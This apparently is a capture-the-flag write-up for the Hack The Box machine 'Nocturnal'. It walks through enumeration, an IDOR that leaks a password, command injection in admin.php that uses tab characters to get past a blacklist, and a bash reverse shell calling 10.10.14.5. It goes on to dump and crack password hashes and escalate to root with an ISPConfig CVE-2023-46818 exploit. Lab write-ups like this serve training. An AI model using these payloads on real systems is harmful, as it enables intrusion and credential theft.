---
authors:
    - Jiri Raja
date: 08-10-2025
---

# Nocturnal

## Foothold

```bash
nmap -sC -sV -v -p- 10.10.11.64
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-16 06:10 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 06:10
Completed NSE at 06:10, 0.00s elapsed
Initiating NSE at 06:10
Completed NSE at 06:10, 0.00s elapsed
Initiating NSE at 06:10
Completed NSE at 06:10, 0.00s elapsed
Initiating Ping Scan at 06:10
Scanning 10.10.11.64 [4 ports]
Completed Ping Scan at 06:10, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 06:10
Completed Parallel DNS resolution of 1 host. at 06:10, 0.00s elapsed
Initiating SYN Stealth Scan at 06:10
Scanning 10.10.11.64 [65535 ports]
Discovered open port 80/tcp on 10.10.11.64
Discovered open port 22/tcp on 10.10.11.64
Completed SYN Stealth Scan at 06:10, 28.71s elapsed (65535 total ports)
Initiating Service scan at 06:10
Scanning 2 services on 10.10.11.64
Completed Service scan at 06:10, 6.15s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.64.
Initiating NSE at 06:10
Completed NSE at 06:10, 1.07s elapsed
Initiating NSE at 06:10
Completed NSE at 06:10, 0.15s elapsed
Initiating NSE at 06:10
Completed NSE at 06:10, 0.00s elapsed
Nmap scan report for 10.10.11.64
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://nocturnal.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 06:10
Completed NSE at 06:10, 0.00s elapsed
Initiating NSE at 06:10
Completed NSE at 06:10, 0.00s elapsed
Initiating NSE at 06:10
Completed NSE at 06:10, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.51 seconds
           Raw packets sent: 66292 (2.917MB) | Rcvd: 66171 (2.647MB)
```

Update etc hosts:

```
10.10.11.64 nocturnal.htb
```

Go to the website.

??? enumeration

    ```bash
    ffuf -w /usr/share/wordlists/dirb/big.txt -u http://nocturnal.htb/FUZZ.php
    ...
    
    admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 33ms]
    dashboard               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 31ms]
    index                   [Status: 200, Size: 1524, Words: 272, Lines: 30, Duration: 33ms]
    login                   [Status: 200, Size: 644, Words: 126, Lines: 22, Duration: 31ms]
    logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 32ms]
    register                [Status: 200, Size: 649, Words: 126, Lines: 22, Duration: 32ms]
    view                    [Status: 302, Size: 2919, Words: 1167, Lines: 123, Duration: 31ms]
    
    ```

Create an account.

We find an upload page, try to upload a file. We can open it on the view page. We can see that there is a username parameter. Let's try to enumerate it:
```bash
ffuf -w /usr/share/wordlists/dirb/big.txt -u "http://nocturnal.htb/view.php?username=FUZZ&file=.pdf" -b "PHPSESSID=49qcqp1qdlf5ovpkagssqgdoc3" -fs 2985
```

```
admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 31ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 32ms]
asd                     [Status: 200, Size: 4193, Words: 1193, Lines: 129, Duration: 35ms]
:: Progress: [20469/20469] :: Job [1/1] :: 1282 req/sec :: Duration: [0:00:17] :: Errors: 0 ::
```

We find the user amanda, and once we list her files we can see that there is an odt file with credentials `amanda:arHkG7HAI68X8s1J`.

Let's log in as her. We can see that there is an option to go to the admin page.

We download the backup and see that in the `admin.php` is a RCE:
```php
function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }

    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}

$password = cleanEntry($_POST['password']);

$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
```

Let's try to generate the password payload, there are a lot of restrictions on the input so we will want to execute a file for a reverse shell instead of starting a reverse shell from the payload.

Create a file `p.pdf` with the following content and upload it as amanda using the website's functionality:

```bash
#!/bin/bash
/bin/bash -c 'bash -i > /dev/tcp/10.10.14.5/1234 0>&1'
```

Start a reverse shell:
```bash
nc -nvlp 1234
```

And use the following payload in burp:
```
POST /admin.php HTTP/1.1
Host: nocturnal.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: http://nocturnal.htb
Connection: keep-alive
Referer: http://nocturnal.htb/admin.php
Cookie: PHPSESSID=49qcqp1qdlf5ovpkagssqgdoc3;
Upgrade-Insecure-Requests: 1
Priority: u=0, i

password=<sh	uploads/p.pdf>&backup=
```

As you can see, we are using tab instead of spaces. Newlines should also be a fine replacement. Also, we are using `<>` output redirect to insert our injection.

## User

In the source code we see that there is a sqlite database: `../nocturnal_database/nocturnal_database.db`.

Get the base64 of the file:
```bash
cat nocturnal_database.db | base64 -w0
```

Save it into a file:
```bash
echo <base64> | base64 -d > noctural_db.db
```

Open the db:
```bash
sqlite3 noctural_db.db
```

List tables:
```sqlite
SELECT name FROM sqlite_master WHERE type='table';
```

Get hashes:
```sqlite
select * from users;
```

Into the hash.txt:
```
admin:d725aeba143f575736b07e045d8ceebb
amanda:df8b20aa0c935023f99ea58358fb63c4
tobias:55c82b1ccd55ab219b3b109b07d5061d
```

Get initial info:
```bash
hashcat --username hash.txt /usr/share/wordlists/rockyou.txt.gz
```

Run the password cracking:
```bash
hashcat --username -m 0 hash.txt /usr/share/wordlists/rockyou.txt.gz
```

Show the cached output:
```bash
hashcat --username -m 0 hash.txt /usr/share/wordlists/rockyou.txt.gz --show
```

Found credentials: `tobias:slowmotionapocalypse`.

```bash
ssh tobias@nocturnal.htb
```

Get the user flag.

## Root

Check for open ports:
```bash
ss -plnt
```

Forward the web server:
```bash
ssh -L 8000:127.0.0.1:8080 tobias@nocturnal.htb
```

We find it's `ispconfig` app. Google the default credentials which are `admin:admin`. It doesn't work, let's try the password for tobias (`slowmotionapocalypse`).

Let's find the version on the web app... `3.2.10p1`.

now let's search for exploit. Google `ispconfig 3.2.10p1 exploit`. We get <https://sploitus.com/exploit?id=C8C641AC-8810-5B1B-878E-D064A44248BB> -> <https://github.com/bipbopbup/CVE-2023-46818-python-exploit>. Download the source code and run the exploit:

```bash
python exploit.py http://localhost:8000/ admin slowmotionapocalypse
```

Get the root flag.
